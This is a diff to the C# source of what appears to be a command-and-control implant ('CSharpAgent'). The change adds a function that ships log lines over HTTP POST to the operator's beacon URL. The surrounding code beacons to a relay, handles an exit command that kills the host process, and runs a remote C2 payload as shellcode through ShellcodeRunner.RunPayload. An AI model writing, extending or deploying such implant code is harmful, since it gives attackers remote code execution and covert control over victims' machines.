@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Net;
 using System.Text;
@@ -32,6 +33,9 @@ namespace CSharpAgent
             catch { }
 
             var headers = Identity.Build();
+            _beaconUrl = beaconUrl;
+            _headers = headers;
+            Log("beaconing to " + beaconUrl + " as " + headers[1][1]);
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
@@ -47,7 +51,7 @@ namespace CSharpAgent
                 byte[] responseBody;
                 try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                 catch (Exception) { responseBody = null; }
-                if (responseBody == null) return; // fatal — mirrors the JScript agent
+                if (responseBody == null) { Log("beacon failed — stopping"); return; } // fatal — mirrors the JScript agent
 
                 pending.Clear();
                 var frames = ParseFrames(responseBody);
@@ -61,6 +65,46 @@ namespace CSharpAgent
             }
         }
 
+        // --- Log fast path (X-Agent-Log: 1) ---------------------------------------
+        //
+        // Same fire-and-forget contract the JScript agent speaks: POST with the full
+        // X-Agent-* identity set plus X-Agent-Log: 1, body = one frame holding the UTF-8
+        // line. The relay answers an EMPTY 200 IMMEDIATELY (no long-poll hold) and
+        // broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
+        // failed ship is swallowed — and there is no local echo at all (headless host).
+
+        private static string _beaconUrl;
+        private static string[][] _headers;
+
+        internal static void Log(string line)
+        {
+            if (_beaconUrl == null || _headers == null) return; // not beaconing yet — nothing to ship on
+            try
+            {
+                var bytes = Encoding.UTF8.GetBytes(line);
+                var body = new byte[4 + bytes.Length];
+                BitConverter.GetBytes(bytes.Length).CopyTo(body, 0);
+                bytes.CopyTo(body, 4);
+
+                var request = (HttpWebRequest)WebRequest.Create(_beaconUrl);
+                request.Method = "POST";
+                request.ContentType = "application/octet-stream";
+                // The relay answers immediately (no long-poll) — a short ceiling keeps a
+                // wedged relay from stalling the beacon loop for a full minute per line.
+                request.Timeout = 15000;
+                request.ReadWriteTimeout = 15000;
+                for (var i = 0; i < _headers.Length; i++)
+                    request.Headers.Add(_headers[i][0], _headers[i][1]);
+                request.Headers.Add("X-Agent-Log", "1");
+                request.ContentLength = body.Length;
+                using (var stream = request.GetRequestStream())
+                    stream.Write(body, 0, body.Length);
+                try { request.GetResponse().Close(); }
+                catch (WebException) { } // 4xx/5xx from the log path is irrelevant
+            }
+            catch { }
+        }
+
         // Command dispatch. Exit (0x0A) never returns — it kills the host process (and any
         // agent injected into it: correct "terminate implant" semantics). NativeUpgrade (0x0C)
         // is this breed's ONE capability; everything else — the deserialization Upgrade
@@ -71,6 +115,7 @@ namespace CSharpAgent
             if (command.Length == 0) return U32Bytes(2);
             if (command[0] == 10)
             {
+                Log("exit");
                 Environment.Exit(0);
                 return null; // unreachable — Exit never returns
             }
@@ -100,10 +145,12 @@ namespace CSharpAgent
                     var payload = C2Payload.Data;
                     if (payload.Length == 0) return U32Bytes(1); // no A_URL ⇒ nothing to inject
                     ShellcodeRunner.RunPayload(payload);
+                    Log("native upgrade injected (" + payload.Length + " bytes)");
                     return U32Bytes(0);
                 }
-                catch
+                catch (Exception e)
                 {
+                    Log("native upgrade failed: " + e.Message);
                     return U32Bytes(1);
                 }
             }
